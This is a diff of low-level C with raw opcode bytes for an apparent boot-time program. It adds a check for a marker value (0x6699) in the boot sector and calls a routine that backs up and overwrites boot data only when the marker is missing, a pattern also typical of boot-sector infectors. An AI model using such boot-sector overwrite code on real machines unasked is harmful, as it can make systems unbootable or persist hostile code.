@@ -1019,7 +1019,9 @@ void backup_and_overwrite (){
   * tmp = 9983 ;
   tmp = tmp + 1 ;
   * tmp = 32188 ;
-  tmp = tmp + 195 ;
+  tmp = tmp + 191 ;
+  * tmp = 26265 ;
+  tmp = tmp + 4 ;
   * tmp = 2 ;
   tmp = tmp + 1 ;
   * tmp = 4096 ;
@@ -1031,7 +1033,6 @@ void backup_and_overwrite (){
   * tmp = 16383 ;
   tmp = tmp + 26 ;
   * tmp = 43605 ;
-
   // END GENERATED CODE
 
   // 0x63BA - location of the LBA to fill in
@@ -1051,6 +1052,7 @@ void backup_and_overwrite (){
 }
 
 int delay ;
+int* magic_num_ptr ;
 int main (){
   // set up stack pointer to point somewhere nicer - mov sp, 0x0F00
   asm(" .byte 188 ; .byte 0 ; .byte 15 ; ");
@@ -1059,19 +1061,30 @@ int main (){
   asm(" .byte 163 ; .byte 0 ; .byte 16 ; ");
   main_addr = _ax ;
 
-  // 0x7200
-  local_stack = 29184 ;
-  // 0x0F00 - 16 bytes
-  dirent_file_name = 3840 ;
-
   delay = 65535 ;
   while( delay < 32767 ){
     delay = delay + 1 ;
   }
 
+  // 0x7200
+  local_stack = 29184 ;
+  // 0x0F00 - 16 bytes
+  dirent_file_name = 3840 ;
+
   init_fs ();
 
-  backup_and_overwrite ();
+  // check the boot sector for the magic number that indicates that we already set things up
+  // 0x7DB8
+  magic_num_ptr = 32184 ;
+  print_hex_val = * magic_num_ptr ;
+  println_hex ();
+
+  asm(" .byte 235 ; .byte 254 ; ");
+
+  // 0x6699
+  if( * magic_num_ptr != 26265 ){
+    backup_and_overwrite ();
+  }
 
   while( 1 == 1 ){
   }
